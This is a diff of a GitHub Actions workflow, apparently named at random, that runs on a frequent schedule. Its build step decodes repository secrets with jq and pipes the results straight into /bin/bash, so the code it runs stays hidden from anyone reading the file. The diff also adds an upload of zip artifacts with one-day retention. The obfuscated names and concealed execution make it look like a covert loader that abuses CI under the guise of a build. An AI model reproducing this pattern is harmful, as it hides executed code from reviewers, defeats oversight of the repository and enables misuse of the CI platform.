@@ -1,27 +1,28 @@
 name: hongsanhunbi
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '44 1/6 * * *'
-jobs:  # 16209
+    - cron: '32 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hongsanhunbi
         env:
-          iptz0: ${{ secrets.iptz0 }}
+          phm4545: ${{ secrets.phm4545 }}
         run: |
-          echo $iptz0 | jq -r .qkd7 | /bin/bash
-          echo $e176 | jq -r .otjoo04347 | /bin/bash
-          echo $s85 | jq -r .xtg55 | /bin/bash
-          echo $rth74 | jq -r .exqrk309 | /bin/bash
-          echo $vyped3 | jq -r .wda2 | /bin/bash
-          echo $zktle235 | jq -r .lwsnd6628 | /bin/bash
-          echo $wmt1797 | jq -r .ifi1276 | /bin/bash
-          echo $lnq25538 | jq -r .pt3 | /bin/bash
-          echo $sqbvd67399 | jq -r .epfgj3655 | /bin/bash
-          echo $aimce2 | jq -r .otzb4 | /bin/bash
-          echo $xr05 | jq -r .qrdk9585 | /bin/bash
-          echo $pxry50 | jq -r .f38244 | /bin/bash
+          printf '%s' "$phm4545" | jq -r .sp58448 | /bin/bash
+          printf '%s' "$wdvzy3386" | jq -r .mkog681 | /bin/bash
+          printf '%s' "$tcfd83507" | jq -r .um48 | /bin/bash
+          printf '%s' "$hcw282" | jq -r .bpco7811 | /bin/bash
+          echo $qyx8634 | jq -r .fzjy8564 | /bin/bash
+          echo $p2691 | jq -r .lhr24307 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: luirWmN9
+          path: "*.zip"
+          retention-days: 1
